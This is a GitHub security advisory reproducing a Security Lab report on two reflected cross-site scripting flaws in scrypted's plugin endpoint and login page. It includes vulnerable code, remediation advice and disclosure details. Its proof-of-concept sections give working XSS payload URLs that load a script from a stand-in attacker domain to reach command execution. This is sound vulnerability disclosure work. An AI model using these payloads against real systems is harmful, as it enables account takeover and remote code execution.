# [H] GitHub Security Lab (GHSL) Vulnerability Report, scrypted: `GHSL-2023-218`, `GHSL-2023-219`

## Summary
Severity: High
Advisory: GHSA-w4hv-vmv9-hgcr
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2024-02-16
Source: https://github.com/advisories/GHSA-w4hv-vmv9-hgcr
Type: github-advisory

## Affected
- npm: `@scrypted/server` — affected >=0
- npm: `@scrypted/core` — affected >=0

## Details
# GitHub Security Lab (GHSL) Vulnerability Report, scrypted: `GHSL-2023-218`, `GHSL-2023-219`

The [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [scrypted](https://github.com/koush/scrypted).

We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.

If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2023-218` or `GHSL-2023-219` as a reference). See also [this blog post](https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/) written by GitHub's Advisory Curation team which explains what CVEs and advisories are, why they are important to track vulnerabilities and keep downstream users informed, the CVE assigning process, and how they are used to keep open source software secure.

If you are _NOT_ the correct point of contact for this report, please let us know!

## Summary

Two refelcted Cross-Site Scripting (XSS) vulnerabilities exist in scrypted that may allow an attacker to impersonate any user who clicks on specially crafted links. In the worst case, an attacker may be able to impersonate an administrator and run arbitrary commands.

## Project

scrypted

## Tested Version

[v55.0](https://github.com/koush/scrypted/releases/tag/v0.55.0)

## Details

### Issue 1: reflected XSS in [`plugin-http.ts`](https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/src/plugin/plugin-http.ts#L45) (`GHSL-2023-218`)

The `owner` and `pkg` parameters are reflected back in the response when the endpoint is not found, allowing for a reflected XSS vulnerability.

```javascript
const { owner, pkg } = req.params;
        let endpoint = pkg;
        if (owner)
            endpoint = `@${owner}/${endpoint}`;
        const pluginData = await this.getEndpointPluginData(req, endpoint, isUpgrade, isEngineIOEndpoint);

        if (!pluginData) {
            end(404, `Not Found (plugin or device "${endpoint}" not found)`);
            return;
        }


```

#### Impact

This issue may lead to `Remote Code Execution`.

#### Remediation

In order to remediate, ensure that parameters are not reflected back in the response. In addition, on error responses where html is unnecessary, set the `text/plain` Content-Type to prevent XSS (express defaults to text/html).

#### Resources

Proof of Concept:

The following url will create a script tag in the current document which will load `attacker.domain/rce.js`. This JavaScript file can then be used to communicate with the server over HTTP via RPC, and send some requests to get the `nativeId` and `proxyID` for the `automation:update-plugins` and achieve the ability to run shell commands at a specified time.

https://localhost:10443/endpoint/%3Cimg%20src%20onerror=a=document.createElement('script');a.setAttribute('src',document.location.hash.substr(1));document.head.appendChild(a)%3E/pkg#//attacker.domain/rce.js

In the browser, you should see the script element be created with the src as `https://attacker.domain/rce.js`.

### Issue 2: reflected XSS in [`plugins/core/ui/src/Login.vue`](https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/ui/src/Login.vue#L79) (`GHSL-2023-219`)

A reflected XSS vulnerability exists in the login page via the `redirect_uri` parameter. By specifying a url with the javascript scheme (`javascript:`), an attacker can run arbitrary JavaScript code after the login.

```javascript
  try {
          const redirect_uri = new URL(window.location).searchParams.get('redirect_uri');
          if (redirect_uri) {
            window.location = redirect_uri;
            return;
          }

        }
```

#### Impact

This issue may lead to `Remote Code Execution`.

#### Remediation

In order to remediate, ensure user-controlled data is not placed into the DOM. Additionally, this is also an open redirect vulnerability because the url is not validated and a user may be redirected to an attacker controlled website after logging in, not knowing they have left the actual real  website. If this redirect_uri parameter is supposed to only redirect to the current website/domain, please incorporate a check that it is only redirecting to the current domain.

#### Resources
Proof of Concept:

When the user is not logged in, send a link to the server with the parameter:

 `redirect_uri=javascript:var script = document.createElement('script');script.src = 'https://attacker.domain'; document.head.appendChild(script);`

at the end of the uri (but before the #).


Example: `https://localhost:10443/endpoint/test/test?redirect_uri=javascript:var%20script%20=%20document.createElement('script');script.src%20=%20'https://attacker.domain';%20document.head.appendChild(script);#//`


Similar to Proof of Concept 1 this will load a JavaScript file which can make authenticated requests to the server, possibly leading to RCE.

## GitHub Security Advisories

We recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).

## Credit

These issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs).
This vulnerability was found with the help of [CodeQL Reflected XSS query](https://codeql.github.com/codeql-query-help/javascript/js-reflected-xss/).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-218` or `GHSL-2023-219` in any communication regarding these issues.

## Disclosure Policy

This report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).

## References
- https://github.com/koush/scrypted/security/advisories/GHSA-w4hv-vmv9-hgcr
- https://nvd.nist.gov/vuln/detail/CVE-2023-47620
- https://nvd.nist.gov/vuln/detail/CVE-2023-47623
- https://github.com/koush/scrypted
- https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/package.json
- https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/src/plugin/plugin-http.ts#L45
- https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/package.json
- https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/ui/src/Login.vue#L79
- https://github.com/koush/scrypted/releases/tag/v0.55.0
